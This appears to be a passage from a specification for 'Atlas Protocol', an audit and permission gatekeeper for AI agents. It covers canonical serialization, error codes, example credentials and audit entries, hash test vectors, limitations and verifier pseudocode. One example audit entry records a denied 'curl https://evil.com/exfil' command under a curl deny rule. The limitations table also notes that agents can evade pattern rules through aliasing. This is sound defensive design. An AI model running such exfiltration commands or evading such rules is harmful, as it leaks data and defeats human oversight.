This appendix defines the canonical serialization used for all hashing and signing operations in the protocol. Two independent implementations that follow these rules MUST produce identical byte strings for the same logical object.

### D.1 Encoding

All canonical payloads MUST be encoded as UTF-8. No BOM. No other encodings are permitted.

### D.2 JSON serialization

Canonical JSON MUST follow these rules:

| Rule | Requirement |
|---|---|
| **Key ordering** | Object keys MUST be sorted by comparing their UTF-8 byte sequences left-to-right, byte-by-byte, unsigned. Shorter keys sort before longer keys when all preceding bytes match (i.e., `"a"` < `"aa"`). This is the same as C `memcmp` on the UTF-8 encoded key bytes. This applies recursively to all nested objects. **Note:** JavaScript's `Array.prototype.sort()` uses UTF-16 code unit comparison, which differs from UTF-8 byte order for characters above U+007F. Implementations using JavaScript MUST either restrict keys to ASCII (true for all Atlas-defined fields) or implement explicit UTF-8 byte comparison. |
| **Array ordering** | Arrays MUST preserve their logical order, except where the spec explicitly requires sorting (e.g., `capabilities` arrays MUST be sorted lexicographically before serialization). |
| **Whitespace** | No insignificant whitespace. No spaces after `:` or `,`. No newlines. No indentation. Equivalent to `JSON.stringify(obj)` with no replacer or space arguments, applied to a key-sorted object. |
| **Strings** | MUST use the minimal JSON escape sequences. Characters above U+001F that do not require escaping MUST NOT be escaped. Unicode escapes MUST use lowercase hex (`\u00e9`, not `\U00E9` or `\u00E9`). |
| **Numbers** | MUST use the shortest decimal representation without trailing zeros. No leading zeros. No positive sign. Integers MUST NOT include a decimal point (`42`, not `42.0`). |
| **Booleans** | `true` or `false` (lowercase, no quotes). |
| **Null** | `null` (lowercase). Fields with value `null` MUST be omitted from the canonical payload entirely, unless the field is explicitly listed as required-when-null in the relevant schema. |
| **Undefined/missing** | Fields that are `undefined` or absent MUST be omitted. |

### D.3 Timestamp normalization

All timestamps in canonical payloads MUST be ISO 8601 format with millisecond precision and UTC timezone designator:

```
YYYY-MM-DDTHH:mm:ss.sssZ
```

Example: `2026-03-29T14:30:00.000Z`

Implementations MUST normalize timestamps to this format before hashing or signing. Timestamps without milliseconds MUST have `.000` appended. Timestamps with non-UTC offsets MUST be converted to UTC.

### D.4 Unknown field handling

When computing a canonical payload for hashing or signing, fields not defined in the relevant schema MUST be excluded. This prevents implementation-specific extensions from breaking cross-implementation signature verification.

### D.5 Derived field exclusion

The following fields are derived (computed from the canonical payload itself) and MUST be excluded before hashing or signing:

| Context | Excluded fields |
|---|---|
| **Credential payloads** | `issuerSignature`, `credentialHash` |
| **Delegation authority payloads** | (none — the entire object is the signed payload) |
| **Audit entries** (hash chain) | `hmac`, `pq_signature` (the entry is hashed/signed without these fields; they are appended after) |
| **Checkpoint entries** | `pq_signature` |
| **Rotation manifests** | `manifestSignature` |

### D.6 Application to specific payloads

**Credential canonical payload:**
1. Start with the full `AgentCredential` object.
2. Remove `issuerSignature` and `credentialHash`.
3. Sort all object keys lexicographically (recursive).
4. Sort `capabilities` array lexicographically.
5. Normalize all timestamps per D.3.
6. Serialize per D.2.
7. The `credentialHash` is SHA3-256 of the resulting byte string.
8. The `issuerSignature` is ML-DSA-65 sign of the resulting byte string.

**Delegation authority payload:**
1. Construct the delegation authority object per §5.2.
2. Sort all keys lexicographically.
3. Sort `capabilities` array lexicographically.
4. Normalize all timestamps per D.3.
5. Serialize per D.2.
6. The chain signature is ML-DSA-65 sign (parent key) of the resulting byte string.

**Audit entry (for hash chain):**
1. Start with the full `AuditEntry` object.
2. Remove `hmac` and `pq_signature`.
3. Sort all keys lexicographically (recursive, including nested objects like `permission`, `policy_result`, `meta`, `mitre`).
4. Normalize all timestamps per D.3.
5. Serialize per D.2.
6. `hmac` = HMAC-SHA256 of the resulting byte string (if configured).
7. `pq_signature` = ML-DSA-65 sign of the resulting byte string (if signer available).
8. The `prev_hash` for the NEXT entry = SHA3-256 of the full serialized line (including `hmac` and `pq_signature`).

**Checkpoint entry:** Same as audit entry.

**Rotation manifest:**
1. Start with the full manifest object.
2. Remove `manifestSignature`.
3. Sort all keys lexicographically.
4. Serialize per D.2.
5. `manifestSignature` = ML-DSA-65 sign of the resulting byte string.

### D.7 Test vectors

Conformant implementations SHOULD include test vectors that verify canonical serialization produces identical byte strings for known inputs. At minimum:

1. A credential payload with known field values → expected SHA3-256 hash.
2. A delegation authority payload → expected SHA3-256 hash.
3. An audit entry → expected `prev_hash` value for the next entry.

> **Note:** The reference implementation's test suite includes these vectors. Third-party implementations SHOULD validate against them before claiming conformance.

## Appendix E: Normative error codes

All error codes are stable string enums. Implementations MUST use these exact values in audit entries, API responses, and machine-readable outputs. Tooling, dashboards, and research artifacts MAY rely on these values for programmatic consumption.

### E.1 Attestation result codes

Returned by the attestation layer (§3.2 step 1). A missing code means attestation succeeded.

| Code | Meaning |
|---|---|
| `UNREGISTERED_AGENT` | No credential found for the provided agent ID |
| `CREDENTIAL_EXPIRED` | Credential exists but its `expiresAt` is in the past |
| `CREDENTIAL_REVOKED` | Credential has been revoked |
| `CAPABILITY_MISMATCH` | Credential is valid but lacks the capability required by the requested tool |

### E.2 Delegation failure codes

Returned when a delegation request fails validation (§5.1).

| Code | Meaning |
|---|---|
| `PARENT_NOT_FOUND` | Parent agent ID not in registry |
| `PARENT_EXPIRED` | Parent credential has expired |
| `PARENT_REVOKED` | Parent credential has been revoked |
| `CAPABILITY_ESCALATION` | Requested child capabilities are not a subset of parent's |
| `DEPTH_EXCEEDED` | Delegation would exceed maximum depth (3) |
| `TTL_EXCEEDS_PARENT` | Requested child TTL would outlive parent's remaining lifetime |

### E.3 Audit verification failure codes

Returned by the audit log verifier (§6).

| Code | Meaning |
|---|---|
| `CHAIN_BROKEN` | `prev_hash` does not match expected hash of previous entry |
| `SEQUENCE_GAP` | `seq` values are not contiguous |
| `SEQUENCE_DUPLICATE` | Same `seq` value appears more than once |
| `HMAC_MISMATCH` | HMAC-SHA256 signature does not match entry content |
| `PQ_SIGNATURE_INVALID` | ML-DSA-65 signature verification failed |
| `INVALID_JSON` | Log line is not valid JSON |
| `ARCHIVE_MISSING` | Referenced archive file not found |
| `ARCHIVE_TAMPERED` | Archive file hash does not match manifest |
| `MANIFEST_SEQ_MISMATCH` | `final_seq`/`next_seq` discontinuity between archives |

### E.4 Break-glass failure codes

Returned when break-glass operations fail.

| Code | Meaning |
|---|---|
| `TOKEN_EXPIRED` | Break-glass token has expired |
| `TOKEN_EXHAUSTED` | Token `max_requests` limit reached |
| `TOKEN_CORRUPT` | Token file exists but cannot be parsed |
| `CONFIRMATION_TIMEOUT` | Operator did not confirm activation within timeout |
| `CONFIRMATION_MISMATCH` | Operator response did not match confirmation code |
| `RELAY_SEND_FAILED` | Could not send confirmation prompt to relay transport |

### E.5 Extensibility

Implementations MAY define additional error codes prefixed with `X_` (e.g., `X_CUSTOM_CHECK_FAILED`). Standard codes MUST NOT be prefixed. Consumers that encounter an unrecognized code SHOULD treat it as a generic failure of the relevant category.

## Appendix F: Canonical worked examples

### F.1 Root credential

```json
{
  "agentId": "did:atlas:550e8400-e29b-41d4-a716-446655440000",
  "name": "primary-claude",
  "role": "admin",
  "issuedAt": "2026-03-29T14:00:00.000Z",
  "expiresAt": "2026-03-30T14:00:00.000Z",
  "publicKey": "a1b2c3d4...(ML-DSA-65 public key, hex-encoded, ~2592 bytes)...",
  "capabilities": ["audit:read", "file:read", "file:write", "identity:register", "identity:revoke", "shell:exec"],
  "version": "0.5.0",
  "revoked": false,
  "issuerSignature": "MEUC...(ML-DSA-65 signature, base64)...",
  "credentialHash": "3b48e327...(SHA3-256 of canonical payload)..."
}
```

The `credentialHash` is computed over the canonical payload (all fields except `issuerSignature` and `credentialHash`, keys sorted, capabilities sorted). The `issuerSignature` is ML-DSA-65 sign(issuerSecretKey, canonicalPayload).

### F.2 Delegated credential

```json
{
  "agentId": "did:atlas:6ba7b810-9dad-11d1-80b4-00c04fd430c8",
  "name": "file-reader-child",
  "role": "tool-caller",
  "issuedAt": "2026-03-29T15:00:00.000Z",
  "expiresAt": "2026-03-30T14:00:00.000Z",
  "publicKey": "b2c3d4e5...",
  "capabilities": ["file:read"],
  "version": "0.5.0",
  "revoked": false,
  "delegated": true,
  "delegation": {
    "rootId": "did:atlas:550e8400-e29b-41d4-a716-446655440000",
    "parentId": "did:atlas:550e8400-e29b-41d4-a716-446655440000",
    "depth": 1,
    "chainSignature": "MEQC...(ML-DSA-65 signature over delegation authority object)..."
  },
  "issuerSignature": "MEUC...",
  "credentialHash": "7d9f2a..."
}
```

### F.3 Delegation authority payload (signed by parent)

```json
{
  "protocol": "atlas-protocol",
  "version": "0.5.0",
  "type": "delegation-authority",
  "rootId": "did:atlas:550e8400-e29b-41d4-a716-446655440000",
  "parentId": "did:atlas:550e8400-e29b-41d4-a716-446655440000",
  "childId": "did:atlas:6ba7b810-9dad-11d1-80b4-00c04fd430c8",
  "capabilities": ["file:read"],
  "expiresAt": "2026-03-30T14:00:00.000Z",
  "depth": 1,
  "childCredentialHash": "7d9f2a..."
}
```

The `chainSignature` in the delegated credential is ML-DSA-65 sign(parentSecretKey, JSON.stringify(above)).

### F.4 Audit entry (POLICY_DENY)

```json
{
  "id": "7f3a9b2e-1c4d-4e5f-8a6b-9c0d1e2f3a4b",
  "timestamp": "2026-03-29T14:05:23.000Z",
  "event": "POLICY_DENY",
  "seq": 42,
  "permission": {
    "request_id": "abcde",
    "tool_name": "Bash",
    "description": "Execute shell command",
    "input_preview": "curl https://evil.com/exfil"
  },
  "policy_result": {
    "verdict": "deny",
    "matched_rule": {
      "tool_pattern": "Bash(*curl*)",
      "action": "deny",
      "reason": "Network exfiltration tool blocked",
      "mitre_id": "T1048"
    },
    "anomaly_flags": ["DATA_EXFILTRATION: outbound data transfer detected"],
    "sensitivity_matches": [],
    "identity_evaluated": false
  },
  "verdict": "deny",
  "rule_id": "Bash(*curl*)",
  "mitre": { "id": "T1048", "name": "Exfiltration Over Alternative Protocol", "tactic": "Exfiltration" },
  "agentId": "did:atlas:550e8400-e29b-41d4-a716-446655440000",
  "identityVerified": true,
  "agentRole": "admin",
  "hash_algorithm": "sha3-256",
  "prev_hash": "a3f2b1c0d9e8f7a6b5c4d3e2f1a0b9c8d7e6f5a4b3c2d1e0f9a8b7c6d5e4f3",
  "pq_signature": "MEUC...(ML-DSA-65 signature, base64)..."
}
```

The next entry's `prev_hash` = SHA3-256 of this entire line (including `pq_signature`).

### F.5 Checkpoint entry

```json
{
  "id": "8a4b5c6d-7e8f-9a0b-1c2d-3e4f5a6b7c8d",
  "timestamp": "2026-03-29T14:10:00.000Z",
  "event": "CHECKPOINT",
  "seq": 100,
  "hash_algorithm": "sha3-256",
  "prev_hash": "e35044e6...(SHA3-256 of seq=99 entry)...",
  "meta": {
    "checkpoint_seq": 100,
    "checkpoint_hash": "e35044e6...",
    "entries_since_start": 101
  },
  "pq_signature": "MEUC..."
}
```

### F.6 Rotation manifest entry

```json
{
  "rotated_name": "audit-20260329-140000.jsonl",
  "entry_count": 500,
  "size_bytes": 1048576,
  "final_hash": "b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4",
  "file_hash": "c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5",
  "final_seq": 499,
  "next_seq": 500,
  "rotated_at": "2026-03-29T14:00:00.000Z"
}
```

The new file's first entry MUST have `prev_hash` = `final_hash` and `seq` = `next_seq` (500).

### F.7 Redacted permission object

```json
{
  "request_id": "abcde",
  "tool_name": "Bash",
  "description": "Execute shell command",
  "input_preview": "REDACTED:e9c7beecbf583f42f83e39aa740f82d2bc9ee62ddaebc5462ce23048579a2b08"
}
```

The `input_preview` was replaced with `REDACTED:HMAC-SHA256(redaction_key, original_value)`. The same original value always produces the same HMAC, enabling frequency analysis without exposing plaintext.

## Appendix G: Conformance test vectors

These test vectors allow third-party implementations to verify canonical serialization and hashing without reading the reference source code. All hashes are computed per Appendix D rules.

### G.1 Credential hash

**Input (canonical form, keys sorted, capabilities sorted):**
```
{"agentId":"did:atlas:00000000-0000-4000-8000-000000000001","capabilities":["file:read","file:write","shell:exec"],"expiresAt":"2026-03-30T00:00:00.000Z","issuedAt":"2026-03-29T00:00:00.000Z","name":"test-agent","publicKey":"0000000000000000","revoked":false,"role":"claude-code","version":"0.5.0"}
```

**Expected SHA3-256:** `3b48e327089abd0ca4578d6cfb8a57a0568544dc3b82e199e77f9ab553e3e6e7`

### G.2 Audit entry prev_hash

**Input (serialized audit line, keys sorted):**
```
{"event":"SESSION_START","hash_algorithm":"sha3-256","id":"00000000-0000-4000-8000-000000000099","prev_hash":"GENESIS","seq":0,"timestamp":"2026-03-29T00:00:00.000Z"}
```

**Expected SHA3-256 (= next entry's `prev_hash`):** `e35044e60e1c8c051d9b383a93b32491db5d2a4c9a85b2a6480e76cfc075bb65`

### G.3 Delegation authority hash

**Input:**
```
{"protocol":"atlas-protocol","version":"0.5.0","type":"delegation-authority","rootId":"did:atlas:00000000-0000-4000-8000-000000000001","parentId":"did:atlas:00000000-0000-4000-8000-000000000001","childId":"did:atlas:00000000-0000-4000-8000-000000000002","capabilities":["file:read"],"expiresAt":"2026-03-30T00:00:00.000Z","depth":1,"childCredentialHash":"3b48e327089abd0ca4578d6cfb8a57a0568544dc3b82e199e77f9ab553e3e6e7"}
```

**Expected SHA3-256:** `4cde93186bcc1d1442ebf69c6ef44e3aec8b46c516649087318148baaa91538d`

### G.4 Redacted field (keyed hash)

**Redaction key:** `atlas-redaction-v1:test-secret-key`
**Input value:** `000-00-0000`
**Expected HMAC-SHA256:** `e9c7beecbf583f42f83e39aa740f82d2bc9ee62ddaebc5462ce23048579a2b08`
**Redacted output:** `REDACTED:e9c7beecbf583f42f83e39aa740f82d2bc9ee62ddaebc5462ce23048579a2b08`

### G.5 Rotation bridge

**Last line of old file:**
```
{"event":"POLICY_ALLOW","seq":499,"prev_hash":"abc123"}
```
**SHA3-256 (= `final_hash` in manifest):** `eea363770aec9554fd590017851868217d4c7b476d8a0bce92a35e78a7c811c0`
**New file's first entry MUST have:** `prev_hash` = `eea363770aec...`, `seq` = `500`

### G.6 Checkpoint verification

A verifier checks a checkpoint by:
1. Reading `meta.checkpoint_hash` from the checkpoint entry.
2. Computing SHA3-256 of the serialized line at `seq = checkpoint_seq - 1`.
3. Comparing. If mismatch → `CHAIN_BROKEN`.

### G.7 Signature verification note

ML-DSA-65 signature test vectors are not included here because they require specific keypair material. The reference implementation's test suite (`tests/agent-identity.test.ts`, `tests/audit-log.test.ts`) generates ephemeral keypairs and verifies signatures end-to-end. Third-party implementations SHOULD validate against the hash test vectors above and then run the signature test suite with their own ML-DSA-65 implementation.

## Appendix H: Security limitations

Atlas Protocol improves auditability and operator oversight for autonomous AI agents. It does NOT provide universal trust guarantees. This section enumerates what Atlas explicitly does not solve.

| Threat | Atlas posture | Residual risk |
|---|---|---|
| **Host compromise** | Atlas cannot protect against a compromised host. If an attacker has root access, they can read signing keys, forge audit entries, and bypass all controls. | Mitigate with host hardening, HSM key storage (future), and external audit anchoring. |
| **Malicious local operator** | Atlas trusts the operator. A malicious operator can approve any request, forge break-glass tokens, and suppress alerts. | Atlas is operator-oversight, not operator-proof. Separation of duties requires organizational controls. |
| **Compromised inference runtime** | If the Ollama instance (or equivalent) is compromised, the Why Layer produces unreliable assessments. | The Why Layer is non-gating by design. It informs but does not decide. Compromised assessments affect narration quality, not permission decisions. |
| **Bad rulesets** | The policy engine enforces rules as written. A misconfigured ruleset with missing deny patterns allows dangerous commands through. | Use `atlas_test_policy` regression testing after every rule change. The reference ruleset covers 96 rules across 13 attack categories. |
| **LLM semantic misunderstanding** | The policy engine uses glob patterns, not semantic analysis. An agent can potentially circumvent string-matching rules via indirect tool invocations or aliasing. | Defense in depth: anomaly detection, behavioral baselines, and Why Layer intent inference supplement pattern matching. |
| **Relay transport compromise** | If the Telegram bot token (or equivalent) is stolen, an attacker can approve requests and suppress denials. | Rotate bot tokens, restrict chat IDs, use two-channel confirmation for bootstrap and break-glass. |
| **Low-entropy redaction** | Bare SHA-256 over low-entropy values (SSN, phone) is trivially reversible via brute force. | Atlas requires HMAC-SHA256 with a secret key for redaction (§6.7). Implementations MUST NOT use bare SHA-256 for low-entropy fields. |
| **Replay / rollback** | An attacker with disk access could truncate the audit log or replay old entries. | Sequence numbers + checkpoints + rotation manifests detect truncation. External anchoring provides strongest defense. |
| **Key compromise without rotation** | If the ML-DSA-65 signing key is stolen, the attacker can forge audit entries and credentials. | Key rotation procedure (§4.5) limits exposure window. HSM storage (future) prevents key extraction. |
| **Multi-party trust without external anchoring** | A single gatekeeper can forge its own audit trail if compromised. External verifiers who rely only on the gatekeeper's key have no independent trust anchor. | External checkpoint anchoring and well-known URI publication (both future) address this. |

## Appendix I: Terminology

| Term | Definition |
|---|---|
| **allow** | Policy verdict that auto-approves a request without operator involvement. |
| **anchor** | A cryptographic commitment (hash, signature, or checkpoint) that pins audit trail state at a specific point. Used to detect truncation or tampering. |
| **archive** | A rotated audit log file moved to the archive directory. Each archive has a corresponding entry in the rotation manifest. |
| **ask** | Policy verdict that forwards the request to the operator for human decision. Default when no rule matches. |
| **attestation** | The process of verifying an agent's identity credential before policy evaluation. Returns a result code (§4.4, Appendix E.1). |
| **checkpoint** | A periodic `CHECKPOINT` audit entry that records the current sequence number and hash anchor. Enables gap detection and truncation defense. |
| **deny** | Policy verdict that immediately blocks a request. Hard-deny rules cannot be overridden by quiet mode, break-glass, or operator approval. |
| **grounded signal** | A signal in a `WhyAssessment` that references a specific audit entry ID, tying the finding to observable evidence. Contrast with an ungrounded signal. |
| **local DID** | A `did:atlas:<uuid>` identifier scoped to a single gatekeeper's registry. Not globally resolvable. See §4.1. |
| **mature baseline** | A behavioral baseline with 200+ sessions (`maturityLevel: "mature"`). Required for quiet mode eligibility. |
| **operator** | The human who receives and responds to permission prompts via the relay transport. Atlas trusts the operator's judgment. |
| **sensitive path** | A file path that matches the minimum sensitive path pattern set (§10.4). Requests targeting sensitive paths are never eligible for quiet mode. |
| **seq** | Global monotonic sequence number on each audit entry. Zero-indexed, never resets, spans rotations. See §6.2.1. |
| **verified identity** | An agent whose credential passed attestation: registered, unexpired, unrevoked, with the required capability. `identityVerified: true` in audit entries. |

## Appendix J: Verifier pseudocode

### J.1 Verify credential

```
function verifyCredential(credential, issuerPublicKey):
    if credential.revoked:
        return CREDENTIAL_REVOKED
    if now() > credential.expiresAt:
        return CREDENTIAL_EXPIRED

    payload = canonicalize(credential, exclude=["issuerSignature", "credentialHash"])
    expectedHash = SHA3-256(payload)
    if credential.credentialHash ≠ expectedHash:
        return "hash mismatch"

    if not ML-DSA-65.verify(issuerPublicKey, payload, credential.issuerSignature):
        return "signature invalid"

    return VALID
```

### J.2 Verify delegated credential

```
function verifyDelegatedCredential(credential, registry, issuerPublicKey):
    baseResult = verifyCredential(credential, issuerPublicKey)
    if baseResult ≠ VALID:
        return baseResult

    parent = registry.get(credential.delegation.parentId)
    if parent is null:
        return "parent not found"
    if parent.revoked:
        return "parent revoked"

    // Reconstruct delegation authority
    baseFields = credential without [issuerSignature, credentialHash, delegated, delegation]
    baseHash = SHA3-256(canonicalize(baseFields))
    authority = {
        protocol: "atlas-protocol", version: credential.version,
        type: "delegation-authority",
        rootId: credential.delegation.rootId,
        parentId: credential.delegation.parentId,
        childId: credential.agentId,
        capabilities: sorted(credential.capabilities),
        expiresAt: credential.expiresAt,
        depth: credential.delegation.depth,
        childCredentialHash: baseHash
    }
    authorityPayload = JSON.stringify(authority)

    if not ML-DSA-65.verify(parent.publicKey, authorityPayload, credential.delegation.chainSignature):
        return "chain signature invalid"

    // Recurse if parent is also delegated
    if parent.delegated:
        return verifyDelegatedCredential(parent, registry, issuerPublicKey)

    return VALID
```

### J.3 Verify audit chain (single file)

```
function verifyAuditChain(lines):
    expectedPrevHash = "GENESIS"
    expectedSeq = -1  // will be set from first entry with seq

    for i, line in enumerate(lines):
        entry = JSON.parse(line)

        // Hash chain
        if entry.prev_hash ≠ expectedPrevHash:
            report CHAIN_BROKEN at line i

        // Sequence continuity
        if entry.seq is defined:
            if expectedSeq ≥ 0 and entry.seq ≠ expectedSeq + 1:
                report SEQUENCE_GAP at line i
            expectedSeq = entry.seq

        // HMAC verification (if configured)
        if entry.hmac:
            stripped = entry without [hmac, pq_signature]
            if HMAC-SHA256(secret, stripped) ≠ entry.hmac:
                report HMAC_MISMATCH at line i

        // PQ signature verification (if available)
        if entry.pq_signature:
            stripped = entry without [pq_signature]
            if not ML-DSA-65.verify(issuerPublicKey, stripped, entry.pq_signature):
                report PQ_SIGNATURE_INVALID at line i

        // Compute next expected prev_hash
        expectedPrevHash = SHA3-256(line)

    return errors
```

### J.4 Verify archive bridge

```
function verifyArchiveBridge(manifest, archives):
    for i, record in enumerate(manifest.rotations):
        archive = readFile(record.rotated_name)

        // File integrity
        if SHA3-256(archive) ≠ record.file_hash:
            report ARCHIVE_TAMPERED

        // Chain anchor
        lastLine = archive.lines[-1]
        if SHA3-256(lastLine) ≠ record.final_hash:
            report CHAIN_BROKEN

        // Sequence bridge to next archive
        if i + 1 < manifest.rotations.length:
            nextArchive = readFile(manifest.rotations[i+1].rotated_name)
            firstEntry = JSON.parse(nextArchive.lines[0])
            if firstEntry.prev_hash ≠ record.final_hash:
                report CHAIN_BROKEN (cross-archive)
            if firstEntry.seq ≠ record.next_seq:
                report MANIFEST_SEQ_MISMATCH
```

### J.5 Verify checkpoint continuity

```
function verifyCheckpoints(lines):
    lastCheckpointSeq = -1

    for line in lines:
        entry = JSON.parse(line)
        if entry.event ≠ "CHECKPOINT":
            continue

        // Verify checkpoint hash matches the entry before it
        prevEntry = lines[entry.seq - 1]  // seq is 0-indexed
        if SHA3-256(prevEntry) ≠ entry.meta.checkpoint_hash:
            report "checkpoint hash mismatch at seq " + entry.seq

        lastCheckpointSeq = entry.seq
```
